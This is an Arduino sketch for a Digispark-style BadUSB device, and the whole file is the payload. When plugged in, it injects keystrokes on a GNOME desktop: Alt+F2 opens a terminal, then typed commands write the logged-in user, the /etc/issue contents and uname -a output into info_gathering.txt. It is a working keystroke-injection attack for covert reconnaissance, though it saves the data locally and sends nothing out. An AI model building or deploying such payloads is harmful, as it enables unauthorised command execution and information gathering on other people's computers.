#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
  delay(3000);
  DigiKeyboard.println("gnome-terminal");
  delay(3000);
  DigiKeyboard.println("echo \"Logged in user: \" $USER > info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo -n \"Distribution Kernel Version: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("cat /etc/issue | cut -c1-13 >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo -n \"uname results: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("uname -a >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  while(1);
}
